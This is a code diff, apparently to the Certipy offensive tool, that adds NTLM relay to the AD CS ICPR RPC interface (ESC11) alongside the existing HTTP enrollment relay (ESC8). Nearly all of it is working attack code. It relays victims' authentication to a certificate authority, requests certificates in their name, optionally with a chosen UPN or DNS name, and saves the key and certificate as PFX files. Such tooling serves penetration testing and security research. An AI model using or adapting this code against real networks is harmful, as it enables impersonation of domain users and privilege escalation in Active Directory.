@@ -10,18 +10,21 @@ from threading import Lock
 
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
 from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPRelayClient
+from impacket.examples.ntlmrelayx.clients import rpcrelayclient
 from impacket.examples.ntlmrelayx.servers import SMBRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.ntlm import NTLMAuthChallengeResponse
 from impacket.spnego import SPNEGO_NegTokenResp
+from impacket.dcerpc.v5 import epm
 
 from certipy.lib.certificate import (
     cert_id_to_parts,
     cert_to_pem,
     create_csr,
     create_pfx,
+    csr_to_der,
     csr_to_pem,
     get_identifications_from_certificate,
     get_object_sid_from_certificate,
@@ -34,6 +37,7 @@ from certipy.lib.certificate import (
 from certipy.lib.errors import translate_error_code
 from certipy.lib.formatting import print_certificate_identifications
 from certipy.lib.logger import logging
+from certipy.commands.req import MSRPC_UUID_ICPR, RPCRequestInterface
 
 try:
     from http.client import HTTPConnection
@@ -41,7 +45,7 @@ except ImportError:
     from httplib import HTTPConnection
 
 
-class ADCSRelayServer(HTTPRelayClient):
+class ADCSHTTPRelayServer(HTTPRelayClient):
     def initConnection(self):
         logging.debug("Connecting to %s:%s..." % (self.targetHost, self.targetPort))
         self.session = HTTPConnection(
@@ -90,6 +94,8 @@ class ADCSRelayServer(HTTPRelayClient):
 
             self.session.user = "%s\\%s" % (domain, username)
 
+            print(self.session.user)
+
             auth = base64.b64encode(token).decode("ascii")
             headers = {"Authorization": "%s %s" % (self.authenticationMethod, auth)}
             self.session.request("GET", self.path, headers=headers)
@@ -114,7 +120,70 @@ class ADCSRelayServer(HTTPRelayClient):
                 logging.error("Use -debug to print a stacktrace")
 
 
-class ADCSAttackClient(ProtocolAttack):
+class ADCSRPCRelayServer(rpcrelayclient.RPCRelayClient, rpcrelayclient.ProtocolClient):
+    def __init__(self, serverConfig, target, targetPort=None, extendedSecurity=True):
+        rpcrelayclient.ProtocolClient.__init__(
+            self, serverConfig, target, targetPort, extendedSecurity
+        )
+
+        self.endpoint = "ICPR"
+
+        self.endpoint_uuid = MSRPC_UUID_ICPR
+
+        logging.info(
+            "Connecting to ncacn_ip_tcp:%s[135] to determine %s stringbinding"
+            % (target.netloc, self.endpoint)
+        )
+        self.stringbinding = epm.hept_map(
+            target.netloc, self.endpoint_uuid, protocol="ncacn_ip_tcp"
+        )
+
+        logging.debug("%s stringbinding is %s" % (self.endpoint, self.stringbinding))
+
+    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
+        if (
+            unpack("B", authenticateMessageBlob[:1])[0]
+            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
+        ):
+            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
+            auth_data = respToken2["ResponseToken"]
+        else:
+            auth_data = authenticateMessageBlob
+
+        self.session.sendBindType3(auth_data)
+
+        try:
+            req = rpcrelayclient.DummyOp()
+            self.session.request(req)
+        except rpcrelayclient.DCERPCException as e:
+            if "nca_s_op_rng_error" in str(e) or "RPC_E_INVALID_HEADER" in str(e):
+                return None, STATUS_SUCCESS
+            elif "rpc_s_access_denied" in str(e):
+                return None, STATUS_ACCESS_DENIED
+            else:
+                logging.info(
+                    "Unexpected rpc code received from %s: %s"
+                    % (self.stringbinding, str(e))
+                )
+                return None, STATUS_ACCESS_DENIED
+
+    def killConnection(self):
+        if self.session is not None:
+            self.session.get_rpc_transport().disconnect()
+            self.session = None
+
+    def keepAlive(self):
+        try:
+            req = rpcrelayclient.DummyOp()
+            self.session.request(req)
+        except rpcrelayclient.DCERPCException as e:
+            if "nca_s_op_rng_error" not in str(e) or "RPC_E_INVALID_HEADER" not in str(
+                e
+            ):
+                raise
+
+
+class ADCSHTTPAttackClient(ProtocolAttack):
     def run(self):
         self.adcs_relay.attack_lock.acquire()
         try:
@@ -368,10 +437,190 @@ class ADCSAttackClient(ProtocolAttack):
         self.finish_run()
 
 
+class ADCSRPCAttackClient(ProtocolAttack):
+    def __init__(self, config, dce, username):
+        super().__init__(config, dce, username)
+
+        self.dce = dce
+        self.rpctransport = dce.get_rpc_transport()
+        self.stringbinding = self.rpctransport.get_stringbinding()
+
+        try:
+            if "/" in username:
+                self.domain, self.username = username.split("/")
+            else:
+                self.domain, self.username = "Unknown", username
+        except Exception as e:
+            print("Got error", e)
+
+    def run(self):
+        self.adcs_relay.attack_lock.acquire()
+
+        self.interface = RPCRequestInterface(parent=self.adcs_relay)
+        self.interface._dce = self.dce
+
+        try:
+            self._run()
+        except Exception as e:
+            logging.error("Got error: %s" % e)
+            if self.adcs_relay.verbose:
+                traceback.print_exc()
+            else:
+                logging.error("Use -debug to print a stacktrace")
+        finally:
+            self.adcs_relay.attack_lock.release()
+
+    def _run(self):
+        if (
+            not self.adcs_relay.no_skip
+            and (self.username + "@" + self.domain) in self.adcs_relay.attacked_targets
+        ):
+            logging.info(
+                "Skipping user %s since attack was already performed"
+                % repr(self.username + "@" + self.domain)
+            )
+            return
+
+        logging.info("Attacking user %s" % repr(self.username + "@" + self.domain))
+
+        request_id = self.adcs_relay.request_id
+        if request_id:
+            self.retrieve()
+        else:
+            self.request()
+
+        self.finish_run()
+
+    def retrieve(self) -> bool:
+        request_id = int(self.adcs_relay.request_id)
+
+        logging.info("Retrieving certificate for request id %d" % request_id)
+
+        cert = self.interface.retrieve(request_id)
+        if cert is False:
+            logging.error("Failed to retrieve certificate")
+            return False
+
+        identifications = get_identifications_from_certificate(cert)
+
+        print_certificate_identifications(identifications)
+
+        object_sid = get_object_sid_from_certificate(cert)
+        if object_sid is not None:
+            logging.info("Certificate object SID is %s" % repr(object_sid))
+        else:
+            logging.info("Certificate has no object SID")
+
+        out = self.adcs_relay.out
+        if out is None:
+            out, _ = cert_id_to_parts(identifications)
+            if out is None:
+                out = self.username
+
+            out = out.rstrip("$").lower()
+
+        try:
+            with open("%d.key" % request_id, "rb") as f:
+                key = pem_to_key(f.read())
+        except Exception as e:
+            logging.warning(
+                "Could not find matching private key. Saving certificate as PEM"
+            )
+            with open("%s.crt" % out, "wb") as f:
+                f.write(cert_to_pem(cert))
+
+            logging.info("Saved certificate to %s" % repr("%s.crt" % out))
+        else:
+            logging.info("Loaded private key from %s" % repr("%d.key" % request_id))
+            pfx = create_pfx(key, cert)
+            with open("%s.pfx" % out, "wb") as f:
+                f.write(pfx)
+            logging.info(
+                "Saved certificate and private key to %s" % repr("%s.pfx" % out)
+            )
+
+        return True
+
+    def request(self) -> bool:
+        template = self.config.template
+
+        if template is None:
+            logging.info("Template was not defined. Defaulting to Machine/User")
+            template = "Machine" if self.username.endswith("$") else "User"
+
+        logging.info(
+            "Requesting certificate for user %s with template %s"
+            % (repr(self.username), repr(template))
+        )
+
+        csr, key = create_csr(
+            self.username,
+            alt_dns=self.adcs_relay.dns,
+            alt_upn=self.adcs_relay.upn,
+            key_size=self.adcs_relay.key_size,
+        )
+        self.key = key
+        self.adcs_relay.key = key
+
+        csr = csr_to_der(csr)
+
+        attributes = ["CertificateTemplate:%s" % template]
+
+        if self.adcs_relay.upn is not None or self.adcs_relay.dns is not None:
+            san = []
+            if self.adcs_relay.dns:
+                san.append("dns=%s" % self.adcs_relay.dns)
+            if self.adcs_relay.upn:
+                san.append("upn=%s" % self.adcs_relay.upn)
+
+            attributes.append("SAN:%s" % "&".join(san))
+
+        cert = self.interface.request(csr, attributes)
+
+        if cert is False:
+            logging.error("Failed to request certificate")
+            return False
+
+        identifications = get_identifications_from_certificate(cert)
+
+        print_certificate_identifications(identifications)
+
+        object_sid = get_object_sid_from_certificate(cert)
+        if object_sid is not None:
+            logging.info("Certificate object SID is %s" % repr(object_sid))
+        else:
+            logging.info("Certificate has no object SID")
+
+        out = self.adcs_relay.out
+        if out is None:
+            out, _ = cert_id_to_parts(identifications)
+            if out is None:
+                out = self.username
+
+            out = out.rstrip("$").lower()
+
+        pfx = create_pfx(key, cert)
+
+        outfile = "%s.pfx" % out
+
+        with open(outfile, "wb") as f:
+            f.write(pfx)
+
+        logging.info("Saved certificate and private key to %s" % repr(outfile))
+
+        return pfx, outfile
+
+    def finish_run(self):
+        self.adcs_relay.attacked_targets.append(self.username + "@" + self.domain)
+        if not self.adcs_relay.forever:
+            self.adcs_relay.shutdown()
+
+
 class Relay:
     def __init__(
         self,
-        ca,
+        target,
+        ca=None,
         template=None,
         upn=None,
         dns=None,
@@ -387,6 +636,7 @@ class Relay:
         debug=False,
         **kwargs
     ):
+        self.target = target
         self.ca = ca
         self.template = template
         self.upn = upn
@@ -406,19 +656,35 @@ class Relay:
         self.attacked_targets = []
         self.attack_lock = Lock()
 
-        target = "http://%s/certsrv/certfnsh.asp" % ca
-        logging.info("Targeting %s" % target)
+        if self.target.startswith("rpc://"):
+            if ca is None:
+                logging.error("A certificate authority is required for RPC attacks")
+                exit(1)
+
+            logging.info("Targeting %s (ESC11)" % target)
+        else:
+            if not self.target.startswith("http://"):
+                self.target = "http://%s" % self.target
+            if not self.target.endswith("/certsrv/certfnsh.asp"):
+                if not self.target.endswith("/"):
+                    self.target += "/"
+                self.target += "certsrv/certfnsh.asp"
+            logging.info("Targeting %s (ESC8)" % self.target)
 
         target = TargetsProcessor(
-            singleTarget=target,
+            singleTarget=self.target, protocolClients={"HTTP": self.get_relay_http_server, "RPC": self.get_relay_rpc_server}
         )
 
         config = NTLMRelayxConfig()
         config.setTargets(target)
         config.setIsADCSAttack(True)
         config.setADCSOptions(self.template)
-        config.setAttacks({"HTTP": self.get_attack_client})
-        config.setProtocolClients({"HTTP": self.get_relay_server})
+        config.setAttacks(
+            {"HTTP": self.get_attack_http_client, "RPC": self.get_attack_rpc_client}
+        )
+        config.setProtocolClients(
+            {"HTTP": self.get_relay_http_server, "RPC": self.get_relay_rpc_server}
+        )
         config.setListeningPort(port)
         config.setInterfaceIp(interface)
         config.setSMB2Support(True)
@@ -444,13 +710,23 @@ class Relay:
             else:
                 logging.error("Use -debug to print a stacktrace")
 
-    def get_relay_server(self, *args, **kwargs) -> ADCSRelayServer:
-        relay_server = ADCSRelayServer(*args, **kwargs)
+    def get_relay_http_server(self, *args, **kwargs) -> ADCSHTTPRelayServer:
+        relay_server = ADCSHTTPRelayServer(*args, **kwargs)
         relay_server.adcs_relay = self
         return relay_server
 
-    def get_attack_client(self, *args, **kwargs) -> ADCSAttackClient:
-        attack_client = ADCSAttackClient(*args, **kwargs)
+    def get_attack_http_client(self, *args, **kwargs) -> ADCSHTTPAttackClient:
+        attack_client = ADCSHTTPAttackClient(*args, **kwargs)
+        attack_client.adcs_relay = self
+        return attack_client
+
+    def get_relay_rpc_server(self, *args, **kwargs) -> ADCSRPCRelayServer:
+        relay_server = ADCSRPCRelayServer(*args, **kwargs)
+        relay_server.adcs_relay = self
+        return relay_server
+
+    def get_attack_rpc_client(self, *args, **kwargs) -> ADCSRPCAttackClient:
+        attack_client = ADCSRPCAttackClient(*args, **kwargs)
         attack_client.adcs_relay = self
         return attack_client
 
